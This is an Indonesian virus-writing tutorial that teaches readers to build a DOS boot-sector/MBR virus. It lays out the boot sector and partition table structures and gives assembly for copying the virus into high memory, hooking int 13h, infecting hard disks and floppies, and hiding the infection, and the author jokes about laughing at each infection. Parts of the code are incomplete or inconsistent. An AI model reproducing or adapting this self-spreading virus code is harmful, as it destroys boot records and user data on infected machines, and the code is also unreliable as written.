                   Pengenalan Penginfeksian Boot (Virus)
                                 by Asmhead

     Virus boot merupakan yg paling mudah diantara yg lainnya. Pada  infeksi 
file,  harus  melakukan  modifikasi  ukuran  file,  waktu, tanggal  yg dapat 
membuat korban  curiga. Pada  virus boot  tidak harus  melakukan semua  ini. 
Kalau udah menetap dimemori, dapat menginfeksi Hard Disk  & floppy  yg tidak 
terproteksi.
     Pada  kenyataanya,  Hard  Disk  dapat  diinfeksi  dg  virus  boot  jika 
melakukan booting dari disket yg sudah terinfeksi. Juga,  kalau punya  lebih 
dari 1 Hard Disk, maka virus dapat menginfeksi MBR/BS pada  Hard Disk  ke-2. 
Beberapa minggu yg lalu, sewaktu gue maen-maen dg penginfeksi MBR,  gue lupa 
menyelamatkan MBR dari Hard Disk ke-2, gue cuma nyelametin MBR Hard Disk  yg 
pertama doank, lalu gue Install virus boot pada offset 1BEh  di Master  Boot 
Record (MBR, track 0, head 0,  sector 1).   Tampaknya ngga  apa-apa, soalnya 
virusnya  berjalan  mulus.   Kemudian  mengembalikan kembali  MBR Hard  Disk 
pertama,  baru  gue  sadar  kalau  lupa  menyimpan MBR  Hard Disk  ke-2. Ada 
perasaan yg ngga enak, dan ternyata itu benar! Setelah menekan tombol Reset, 
setelah Windows dimuat, Hard  Disk ke-2  gua hilang  beserta isinya.   Cukup 
keren  bukan,  gue  harap  ini  hanya  terjadi  pada  gue.  Itu  cuma faktor 
non-teknis.  Siapapun  harus  berhati-hati  dalam percobaan  virus, terutama 
virus boot. Akhir cerita.

 Pelajaran Dimulai

Sampai sekarang gue cuma tau 3 cara menginstall virus boot :
 - Menggunakan dropper yg terpisah dari virus
 - Menggunakan dropper yg
 - Menggunakan program rawrite (ada pada CD Linux) fungsinya sama seperti 
   seperti diatas. Tapi hanya mendukung penulisan ke floppy.

   So, inilah struktur dari boot sektor:
;------------------------------------------------------------
; Offset | Size Ý Description          
;------------------------------------------------------------
;   0h   |  3   | Jump to executable code
;------------------------------------------------------------
;   3h   |  8   | name and version of the OS
;-----------------------------------------------------------
;   0Bh  |  2   | Sector Size
;-----------------------------------------------------------
;   0Dh  |  1   | Sectors cluster size 
;-----------------------------------------------------------
;   0Eh  |  2   | Reserved sectors before 1st FAT
;-----------------------------------------------------------
;   10h  |  1   | Number of File Allocation Tables (FATs) copies
;---------------------------------------------------------------
;   11h  |  2   | Maximum number directory entries (32 bytes each) in root
;-------------------------------------------------------------------------
;   13h  |  2   | Total number of sectors in disk.
;--------------------------------------------------------------------
;   15h  |  1   | Disk type (same as 1st byte in FAT)
;--------------------------------------------------------------------
;   16h  |  2   | FAT size (in sectors)
;--------------------------------------------------------------------
;   18h  |  2   | Sectors per track (cylinder)
;--------------------------------------------------------------------
;   1Ah  |  2   | Number of read/write heads
;---------------------------------------------------------------------
;   1Ch  |  2   | Hidden sectors LOword (partitions < 32MB)
;
; dll,sampai....
;------------------------------------------------------------------
;   3eh  Ý  450 Ý Boot code & data 
;------------------------------------------------------------------

Lalu DOS melanjutkan membaca disk.

Sekarang kita lihat struktur MBR:

          ;-----------------------------------------------
          | Offset | Size |         Description          |
          ;-----------------------------------------------
          ;   0h   | 446  | Master bootstrap loader code |
          ;-----------------------------------------------
          ;  1BEh  |  16  | Partition 1 entry            |                            

   Record Partisi adalah array 16 byte. Letaknya didalam partisi.
   Ini strukturnya :

                   | Offset | Size |   Description       |
                   |-------------------------------------|
                   |   0h   |   1  | Boot indicator      
                   |-------------------------------------|
                   |   1h   |   1  | Beginning head      
                   |-------------------------------------|
                   |   2h   |   1  | Beginning sector    
                   |-------------------------------------|
                   |   3h   |   1  | Beginning cylinder  
                   |-------------------------------------|
                   |   4h   |   1  | OS indicator        
                   |-------------------------------------|
                   |   5h   |   1  | Ending head         
                   |-------------------------------------|
                   |   6h   |   1  | Ending sector       
                   |-------------------------------------|
                   |   7h   |   1  | Ending cylinder     
                   |-------------------------------------|
                   |   8h   |   4  | Relative starting sector
                   |-------------------------------------|
                   |  0Ch   |   4  | Number of sectors   
                   |-------------------------------------|

                            dan seterusnya...
          ;-----------------------------------------------
          ;  1CEh  |  16  | Partition 2 entry            |
          ;-----------------------------------------------
          ;  1DEh  |  16  | Partition 3 entry            |
          ;-----------------------------------------------
          ;  1EEh  |  16  | Partition 4 entry            |
          ;-----------------------------------------------
          ;  1FEh  |   2  | 55AAh signature              |
          ;-----------------------------------------------

Setelah harddisk telah terinfeksi oleh virus,  setiap akses  ke floppy  akan 
melakukan penginfeksian juga. Satu hal yg harus diinget, bahwa MBR hanya ada 
pada Hard Disk, bukan pada floppy. Floppy hanya punya Boot Sektor, hard disk 
punya MBR, karena bisa dipartisi lebih dari 1 (max. 4  partisi dalam  sebuah 
physical harddisk).


 Interrupt:

    Dalam  membuat  virus boot  hanya digunakan  interrupt sebelum  int 20h. 
Karena pada  saat itu,  DOS blon  dimuat ke  memori. Interrupt  populer untk 
akses ke disk adalah int 13h ah, 02 = read; ah, 03 = write.

    Int 13h/fungsi 2 digunakan untk membaca 1 atau lebih sektor  dari disket 
    ke memori.

      AH = 02h
      AL = number of sectors to read (must be nonzero)
      CH = low eight bits of cylinder number
      CL = sector number 1-63 (bits 0-5)
           high two bits of cylinder (bits 6-7, hard disk only)
      DH = head number
      DL = drive number (bit 7 set for hard disk)
      ES:BX -> data buffer

  * Interrupt 13h / AH = 3

     Sama seperti fungsi 2,  tapi bukannya  membaca, melainkan  menulis data 
     pada sektor.

      AH = 03h
      AL = number of sectors to write (must be nonzero)
      CH = low eight bits of cylinder number
      CL = sector number 1-63 (bits 0-5)
           high two bits of cylinder (bits 6-7, hard disk only)
      DH = head number
      DL = drive number (bit 7 set for hard disk)
      ES:BX -> data buffer

The Infection Theory:

    1. Alokasikan top of memory untk virus.
    2. Copy virus ke memori yg dialokasikan.
    3. Hook interrupt 13h.
    4. Virus mencari partisi/boot sektor yg aktif untk kemudian direboot
       dg int 19h.
    5. Baca & cek tanda infeksi. Jika sudah terinfeksi virus terus stealth.
    6. Jika  tidak, teruskan  infeksi dgn  membaca 1  sektor dan  copy info 
       floppy (pada db 3ch dup(?)).
    7. Pilih sektor virus, harddisk atau floppy, lalu  kemudian tulis  badan
       virus, setelah selesai keluar.

    Sebelum mengalokasi virus, kita harus set stack ke 0:7C00h (SS:SP),  set 
dilakukan  pada  awal-awal,  karena  virus boot  selalu dimulai  pada alamat 
tersebut.

   xor  di,di
   cli                 ; disable interrupt
   mov  ss,di
   mov  sp,07c00h
   sti                 ; enable it again   
   

Kemudian kurangi 1KB memori. Sebelumnya, DS harus 0. Pada saat  itu register 
AX  tetap  0, kita  dapat mengisikannya  ke DS.  Dan mendapatkan  nilai baru 
dg int 12h. Setelah itu, konversi ke satuan paragraf.

    mov  ds,ax
    dec  word ptr ds:[413h]
    mov  ax,word ptr ds:[413h] ;    int 12h
 
    mov cl,6
    shl ax,cl

Setelah shl ax, lalu letakan hasilnya di es.  Tidak dapat  dilakukan shl  dg 
register es, TASM akan memberi peringatan "Illegal use of segment register". 
Oleh karena ini gunakan ax untuk mengisi es.

    mov es,ax

Sekarang es diisi dari  hasil ax.  Yang kita  butuhkan sekarang  adalah copy 
virus dari 07C00h ke top of memory.

    sub di,di
    mov si,07c00h
    mov cx,EndBootVirus-Start
    cld
    rep movsw

Virus sudah ada dimemori sekarang. ;-)
    push es
    mov ax,offset inmemory
    push ax
    retf

Bagian lain yang memodifikasi interrupt 13h.

   lds ax,ds:[13h*4]                    ; get int13h
   mov word ptr cs:[old_int13h], ax        ; save it in old_13h
   mov ax, word ptr ds:[13h*4+2]
   mov word ptr cs:[old_int13h+2], ax

   mov word ptr ds:[13h*4],offset int13h_handler  ; replace with my own handler
   mov word ptr ds:[13h*4+2],es    

   int 19h                             ;reboot with the virus in memory

Sekarang bagian int13h_handler, nantinya kita tidak  bisa memakai  subfungsi 
lain, seperti : checking drive, write, reset dll. Berikut kodenya :

int13h_handler:
   cmp cx,1                  ;check if sector 1 and track 0
   jne out_hoeq
   cmp dh,0                  ;check if head 0
   jne out_hoeq
   cmp ah,2                  ;read from sector 1 ?
   jne out_hoeq
   call bios_int13h          ;fake int13h call
   jnc infect_call           ;if no error, jump to our code
out_hoeq:
   db 0eah                   ;else jump to the original Int 13h
old_int13h dd ?              ;original int13h save in here


Untuk melakukan fake call, berikut kodenya:
Kode ini kompatibel bios(DOS) dan Win9x.

bios_int13h:
      pushf
      call  dword ptr cs:[old_int13h]
      ret

Instruksi selanjutnya adalah pengecekan tanda infeksi.

      pushf    ; save all flags first
      pusha    ; only 286+ instruction

      cmp  word ptr es:[bx+offset mark],'MN' 

Sebagai tanda, tanda aslinya 'NM'
      jne  continue_infection

Kita harus menyamakan nilai  CS=DS=ES. Baca  informasi boot  pada offset  3h 
dari awal.

      push cs cs
      pop es ds      

      mov bx,200h                          
      mov ax,201h                         ;read one sector
      call bios_int13h

      mov cx,3ch                          ;copy 3ch bytes
      mov si,202h                         ;from CS:514 = 202h
      mov di,2                            ;to CS:2
      cld                                 ;clear direction flag
      rep movsb                           ;copy

Lalu virus memilih untuk menulis MBR/BS asli pada harddisk atau floppy.

      mov  ax,301h
      call GetRandomSector
      call bios_int13h

GetRandomSector:
      xor dl,dl
      sub dh,dh
      mov cx,2
      ja  harddisk
      mov cx,13h
      mov dh,1
harddisk:
      ret

Setelah semuanya selesai dilakukan jump ke bagian selanjutnya.   Tulis virus 
pada disk yg telah kita pilih pada bagian sebelumnya. Dan ini  merupakan the 
ultimate code.

   xor bx,bx                           ;from CS:0
   xor dh,dh                           ;to head 0
   mov cx,1                            ;track 0, sector 1
   mov ax,301h                         ;write boot virus
   call bios_int13
   jnc short exit

Kalao udah ada tanda infeksi disono, maka akan pindah ke bagian ini.  Bagian 
Stealth.

stealth:
   mov ax,201h                         ;read the original MBR/BS in memory
   call GetRandomSector
   call bios_int13h

Phew..... sekarang pada bagian terakhir dari kode, keluar dari bagian ini.
Dan tertawa keras pada tiap infeksi yg dilakukan orang.

exit:
   pop es ds                           ;pop everything from the stack
   popa
   popf
   retf 2

   mark  db 'NM'

   Org  1beh
                    ; Two last bytes .....
   db  55h,aah      ; boot signature /(bios signature)

end:

Selesai, yg bisa dilakukan hanyalah memahaminya dan latihan tentunya. Semoga 
semua org bisa mengerti dengan jelas. Khususnya untuk org Indonesia,  semoga 
dapat belajar lebih mengenai  virus boot.   Dalam kata  lain, baca  sebanyak 
mungkin  tiap  hari  tentang  apa  yg  lu  suka.  Tulisan ini  dibuat dengan 
pemahaman dari berbagai artikel.

